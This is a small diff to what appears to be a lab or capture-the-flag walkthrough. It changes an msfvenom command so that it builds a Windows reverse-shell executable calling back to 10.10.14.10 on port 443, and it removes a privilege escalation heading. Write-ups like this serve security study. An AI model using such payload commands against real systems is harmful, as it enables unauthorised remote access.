@@ -123,7 +123,7 @@ Now we have a shell back and should enumerate more inside to find more about the
 
 
 
-### Privilege Escalation
+
 
 We take a look at all the details of the system
 
@@ -161,7 +161,7 @@ python -m SimpleHTTPServer 8000
 Making a new reverse.exe
 
 ```zsh
-msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe > reverse.exe
 ```
 Uploading the new reverse.exe 
 
